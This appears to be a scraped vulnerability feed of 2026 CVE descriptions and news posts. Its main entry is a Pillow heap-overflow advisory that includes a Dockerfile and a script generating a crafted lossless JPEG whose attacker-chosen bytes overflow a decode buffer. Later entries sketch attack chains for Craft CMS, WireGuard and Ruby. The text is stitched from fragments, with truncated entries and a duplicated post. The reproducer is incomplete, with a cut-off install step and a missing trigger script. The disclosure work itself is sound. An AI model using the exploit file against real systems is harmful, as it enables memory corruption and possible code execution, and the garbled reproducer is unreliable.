CVE-2026-112403.description:
## Summary

`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state->xsize`, `state->ysize` and `state->bits`.

libjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.

The input is a standards-compliant JPEG, so `Image.open(..., formats=["JPEG"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` ("SOF3", "Spatial lossless") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.

## Affected code

At `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):

- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.
- `src/decode.c:222-231` — `_setimage()`; `state->buffer = calloc(1, state->bytes)` with `state->bytes = (state->bits * state->xsize + 7) / 8`.
- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.
- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: ("SOF3", "Spatial lossless", SOF)`.

```c
// src/libImaging/JpegDecode.c
            if (context->scale > 1) {
                context->cinfo.scale_num = 1;
                context->cinfo.scale_denom = context->scale;
            }
            ...
        case 2:
            if (!jpeg_start_decompress(&context->cinfo)) {
                break;
            }
            state->state++;
            /* fall through */
        case 3:
            ok = 1;
            while (state->y < state->ysize) {
                ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);
```

Because `state->ysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s >= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.

## Primitive

Per scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.

Measured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.

Threshold: `draft()` must select `s >= 2`, i.e. `W // requested_w >= 2` and `H // requested_h >= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H >= 1024`.

## Reproduction

Self-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:

```bash
docker build -t pillow-sof3-oob . && docker run --rm pillow-sof3-oob
```

`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.

### `Dockerfile`

```dockerfile
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=e41083f383c9cd3db95de52564cc0b6452313d4a
ARG CLANG_VERSION=20
ARG LIBJPEG_TURBO_TAG=3.1.4

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake nasm pkg-config libc6-dev gcc \
        wget gnupg lsb-release software-properties-common \
        python3 python3-dev python3-pip python3-venv zlib1g-dev \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-20
ENV CXX=clang++-20
ENV CFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV CXXFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV LDFLAGS="-fsanitize=address"

# --- libjpeg-turbo 3.x (lossless SOF3 support) built with ASan ---
RUN git clone https://github.com/libjpeg-turbo/libjpeg-turbo /src/libjpeg-turbo
RUN cd /src/libjpeg-turbo && git checkout ${LIBJPEG_TURBO_TAG} \
    && cmake -B /build/ljt -S . -DCMAKE_BUILD_TYPE=None \
        -DCMAKE_C_COMPILER=clang-20 \
        -DCMAKE_C_FLAGS="$CFLAGS" \
        -DCMAKE_EXE_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_INSTALL_PREFIX=/opt/ljt -DWITH_JPEG8=0 -DENABLE_STATIC=0 \
    && cmake --build /build/ljt -j"$(nproc)" && cmake --install /build/ljt

# --- Pillow at the pinned commit, built with ASan against that libjpeg ---
RUN git clone https://github.com/python-pillow/Pillow /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

ENV JPEG_ROOT=/opt/ljt
ENV LD_LIBRARY_PATH=/opt/ljt/lib
RUN python3 -m venv /venv \
    && /venv/bin/pip install --quiet --upgrade pip "setuptools>=80" wheel pybind11 \
    && CFLAGS="$CFLAGS" LDFLAGS="$LDFLAGS -Wl,-rpath,/opt/ljt/lib" \

    && ln -sf "$(clang-20 -print-file-name=libclang_rt.asan-x86_64.so)" /opt/libasan.so \
    && LD_PRELOAD=/opt/libasan.so ASAN_OPTIONS=detect_leaks=0 \
       /venv/bin/python3 -c "from PIL import Image, features; print(Image.__version__, features.version('jpg'))"

COPY make_sof3.py /tmp/make_sof3.py
COPY trigger.py /tmp/trigger.py
RUN python3 /tmp/make_sof3.py /tmp/sof3_gray_1200x1100.jpg

ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-20/bin/llvm-symbolizer

CMD ["/bin/sh","-c","cd /tmp && /venv/bin/python3 /tmp/trigger.py 2>&1; echo EXIT=$?"]
```

### `make_sof3.py`

```python
#!/usr/bin/env python3
"""Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.

Standards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).
Rows carry an attacker-chosen marker byte pattern verbatim (lossless => exact).
"""
import struct
import sys

W = 1200
H = 1100
MARKER = b"AAAABBBBCCCCDDDD"  # attacker-chosen bytes that land past the buffer


class BitWriter:
    def __init__(self):
        self.out = bytearray()
        self.acc = 0
        self.n = 0

    def put(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.n += 1
            if self.n == 8:
                self.out.append(self.acc)
                if self.acc == 0xFF:
                    self.out.append(0x00)  # byte stuffing
                self.acc = 0
                self.n = 0

    def flush(self):
        while self.n:
            self.put(1, 1)
        return bytes(self.out)


# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.
BITS = [0] * 17
BITS[5] = 17
HUFFVAL = list(range(17))
CODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}


def category(d):
    if d == 0:
        return 0
    return abs(d).bit_length()


def build_pixels():
    rows = []
    for y in range(H):
        row = bytearray()
        while len(row) < W:
            row += MARKER
        rows.append(bytes(row[:W]))
    return rows


def main(path):
    rows = build_pixels()
    bw = BitWriter()
    prev = None
    for y in range(H):
        row = rows[y]
        for x in range(W):
            s = row[x]
            if y == 0 and x == 0:
                pred = 1 << 7          # 2^(P-1-Pt)
            elif x == 0:
                pred = prev[0]         # Rb for first sample of a line
            else:
                pred = row[x - 1]      # Ra, predictor 1
            d = (s - pred) & 0xFFFF
            if d >= 0x8000:
                d -= 0x10000
            ssss = category(d)
            code, length = CODES[ssss]
            bw.put(code, length)
            if ssss:
                v = d if d > 0 else d + (1 << ssss) - 1
                bw.put(v & ((1 << ssss) - 1), ssss)
        prev = row
    entropy = bw.flush()

    out = bytearray()
    out += b"\xff\xd8"                                        # SOI
    # DHT: class 0 (DC/lossless), table id 0
    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)
    out += b"\xff\xc4" + struct.pack(">H", len(dht) + 2) + dht
    # SOF3: lossless, Huffman, sequential
    sof = struct.pack(">BHHB", 8, H, W, 1) + bytes([1, 0x11, 0])
    out += b"\xff\xc3" + struct.pack(">H", len(sof) + 2) + sof
    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0
    sos = bytes([1, 1, 0x00, 1, 0, 0])
    out += b"\xff\xda" + struct.pack(">H", len(sos) + 2) + sos
    out += entropy
    out += b"\xff\xd9"                                        # EOI
    with open(path, "wb") as f:
        f.write(bytes(out))
    print(f"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/sof3_gray_1200x1100.jpg")
```

Negative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.

```

thumbnail OK, size = (256, 235) -- no ASan report
```

## Scope and caveats

- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.
- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo >= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.
- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.
- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.
- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.

CVE-2026-115806.description: The Prime Mover – Backup and Migration plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 2.2.1 via deserialization of untrusted input in the migration search-and-replace routine (recursiveUnserializeReplace()). CVE-2026-107685.description:
Improper Certificate Validation vulnerability in the WebSocket streaming client in agentjido req_llm allows an on-path attacker to read and modify OpenAI WebSocket sessions, including the authorization bearer token, via a TLS certificate the client does not trust. ReqLLM.Streaming.WebSocketSession.Client.start/3 in lib/req_llm/streaming/web_socket_session/client.ex starts WebSockex without TLS options, and WebSockex defaults to insecure: true, which connects with verify: :verify_none. The option allowlist also drops any caller-supplied cacerts or ssl_options, so an application cannot turn verification on.

The OpenAI Responses, Realtime, and Codex WebSocket paths reach this client and send the API key or OAuth access token in the authorization header. HTTP streaming through Finch and the HTTP/2 duplex session through Mint verify certificates and are not affected.

This issue affects req_llm: from 1.9.0 before 1.29.0.

🟠 CVE-2026-115938 - High (8.8)

Craft CMS allows any authenticated control panel user to submit an element-search condition whose element selector is evaluated as a sandboxed Twig object template. Craft’s allowed column filter delegates property lookup to Yii ArrayHelper, o...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-115938/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-115938.description:
Craft CMS allows any authenticated control panel user to submit an element-search condition whose element selector is evaluated as a sandboxed Twig object template. Craft’s allowed column filter delegates property lookup to Yii ArrayHelper, outside Twig’s SecurityPolicy. Repeated single-segment lookups therefore bypass the sandbox’s empty property/method allowlists.



The vulnerable condition value is ultimately cast to an integer. That does not protect the secret: the template can return author ID 1 when a guessed key character is correct and an impossible ID otherwise. The JSON endpoint returns entries for the first case and an empty array for the second, forming a stable remote character oracle.



After recovering GeneralConfig::securityKey, the same user can compute Craft’s generic HMAC wire format offline. Signed parameters such as redirect are then accepted and passed to unsandboxed View::renderObjectTemplate(), where Twig’s string-callable form can invoke native PHP callables. The regression proof uses the harmless substr() callback and observes abcdef becoming cdef; it does not execute an OS command.

The Mollie webhook endpoint accepts two independent, attacker-controlled parameters and never verifies that they belong together:

  *  commerceTransactionHash — selects which Craft Commerce transaction is completed
  *  id — selects which Mollie payment is queried for its status




An unauthenticated attacker holding any paid Mollie payment ID from the merchant’s account can pair it with any transaction hash.



Commerce queries Mollie, sees status: paid, and marks the target transaction successful for that transaction’s full
amount, regardless of how much was actually paid.

CVE-2026-115935.description:
The app/process-api-response-headers action accepts fake Craft API response headers from any authenticated control panel user.



A non-admin user with only accessCp can place newline characters in X-Craft-Plugin-Licenses. Craft passes this value to its .env writer without removing the newlines.



This lets the user insert a new attacker-known CRAFT_SECURITY_KEY into .env. After Craft loads that key, the user can forge a signed login redirect containing a Twig system() callback.



This is different from the previous report. That report reads the existing key through a Twig sandbox bypass. This report replaces the key through fake API headers and CRLF injection. Fixing either source does not fix the other.

The WireGuard VPN service in subsys/net/lib/wireguard/wg.c updated the peer endpoint from a message it could not authenticate. In handle_transport_data(), when the 32-bit receiver index of an incoming transport-data message matched no session, the...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-79977/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-79977.description:
The WireGuard VPN service in subsys/net/lib/wireguard/wg.c updated the peer endpoint from a message it could not authenticate. In handle_transport_data(), when the 32-bit receiver index of an incoming transport-data message matched no session, the code both scheduled a new handshake and copied the datagram's source address into peer->endpoint with memcpy(&peer->endpoint, peer_addr, sizeof(peer->endpoint)). Because the receiver index is unknown, there is no key with which such a message could be verified, so the address written into peer->endpoint is entirely attacker-supplied. Every other endpoint update in the implementation happens only after authentication — after the Noise handshake in handle_handshake_init(), or after AEAD decryption plus the anti-replay check in wg_process_data_message().

The WireGuard listener is registered with net_udp_register() using no remote address or port filter and defaults to UDP port 51820 (CONFIG_WIREGUARD_PORT), and wg_ctrl_recv() resolves the peer by interface rather than by any cryptographic identity. Any host able to send a UDP datagram to that port can therefore reach the defect off-path, with no need to observe legitimate traffic: a 16-byte datagram carrying the transport-data type, zeroed reserved bytes and an arbitrary receiver index is sufficient. The vulnerable branch runs whenever the peer has neither a valid handshake nor a current keypair — the state at boot and after a session expires.

A single spoofed datagram redirects peer->endpoint to an address of the attacker's choosing, and all subsequent handshake initiations, keepalives and encrypted data packets are sent there. The legitimate peer never receives the initiations and so never re-authenticates, and nothing resets the endpoint afterwards, leaving the tunnel persistently unusable on devices whose peer does not initiate handshakes itself. The attacker can also relay the redirected initiations to the real peer to place itself in the path of the tunnel, observing ciphertext and traffic metadata and selectively dropping packets. WireGuard's end-to-end cryptography still prevents decryption or forgery of tunnel content, so the impact is loss of availability plus limited confidentiality, not key compromise.

The fix removes the endpoint learning from this path entirely: the stale-session recovery is kept, but the handshake is sent only to an endpoint learnt from an authenticated message, falling back to the configured cfg_endpoint, and the message is dropped when neither is known. CONFIG_WIREGUARD is marked experimental and is not enabled by default.

posts.content:
🚨 Ruby fixes three regex engine bugs linked to remote code execution risks

Ruby has released versions 4.0.9, 3.4.12 and 3.3.13 to address three memory corruption bugs in its Onigmo regular expression engine.
⠀
The flaws involve a double free and two integer overflow conditions. GitLab found that specially crafted regex patterns could trigger the bugs and potentially allow remote code execution.

Four GitLab vulnerabilities rely on the underlying issues:

• CVE-2026-89078
• CVE-2026-93577
• CVE-2026-97229
• CVE-2026-110264
⠀
Applications are only exposed when they compile regular expressions from attacker-controlled input. Ruby warns that Regexp.timeout and pattern length limits do not reliably prevent exploitation.

Administrators should update to Ruby 4.0.9, 3.4.12 or 3.3.13 and avoid compiling untrusted regex patterns if an immediate upgrade is not possible.

CVE-2026-89078.description: GitLab has remediated an issue in GitLab CE/EE affecting all versions from 19.2 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user to execute arbitrary code on the GitLab server due to a double free issue when parsing a specially crafted regular expression in a CI/CD configuration.

posts.content:
🚨 Ruby fixes three regex engine bugs linked to remote code execution risks

Ruby has released versions 4.0.9, 3.4.12 and 3.3.13 to address three memory corruption bugs in its Onigmo regular expression engine.
⠀
The flaws involve a double free and two integer overflow conditions. GitLab found that specially crafted regex patterns could trigger the bugs and potentially allow remote code execution.

Four GitLab vulnerabilities rely on the underlying issues:

• CVE-2026-89078
• CVE-2026-93577
• CVE-2026-97229
• CVE-2026-110264
⠀
Applications are only exposed when they compile regular expressions from attacker-controlled input. Ruby warns that Regexp.timeout and pattern length limits do not reliably prevent exploitation.

Administrators should update to Ruby 4.0.9, 3.4.12 or 3.3.13 and avoid compiling untrusted regex patterns if an immediate upgrade is not possible.

CVE-2026-93577.description: GitLab has remediated an issue in GitLab CE/EE affecting all versions from 19.2 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user to execute arbitrary code on the GitLab server due to an integer overflow issue when compiling a specially crafted regular expression in a CI/CD configuration.
